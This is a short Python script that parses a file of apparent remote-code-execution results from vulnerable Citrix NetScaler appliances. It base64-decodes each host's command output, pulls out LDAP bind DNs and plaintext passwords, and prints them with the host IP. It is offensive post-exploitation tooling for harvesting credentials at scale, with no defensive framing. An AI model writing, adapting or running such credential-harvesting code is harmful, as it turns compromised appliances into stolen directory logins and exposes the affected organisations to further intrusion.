# -*- coding: utf-8 -*-
import os
import sys
import json
import base64
flagged_ldap = []

def process_file(chuck_norris):
    
    target_list = [line. rstrip('\n') for line in open(chuck_norris)]
    for target in target_list:
        try:
           input_target = json.loads(target)
           json_acceptable_string = input_target.replace("'", "\"")
           #print(json_acceptable_string)
           newstr = json.loads(json_acceptable_string)
           helluva_day = {}
           ip = newstr['ip']
           port = newstr['port']
           result = newstr['result']
           status = newstr['status']
           rce_result = base64.b64decode(newstr['rce_result'])
           if rce_result:
              for line in rce_result.splitlines( ):
                  if "ldap" in line:
                      lines = line.split(';')
                      for liner in lines:
                          newp = liner.splitlines()
                          
                          helluva_day['ip'] = ip
                          for junk in newp:
                              if "bdn" in junk:
                                  print(junk.replace('bdn=',''))
                                  helluva_day['bdn'] = junk
                                  
                              if "password" in junk:
                                  print(junk.replace('password=',''))
                                  helluva_day['password'] = junk.replace('password=','')
                                  
              if helluva_day:     
                 flagged_ldap.append(json.dumps(helluva_day))
                 
        except:
            pass
        

def main():
    filetocheck = "vulnerablenetscalers.txt"
    try:
        process_file(filetocheck)
    except Exception as file_error:
        print(file_error)
        pass
    
    for ldaps in flagged_ldap:
        if ldaps:
           print(ldaps)
main()
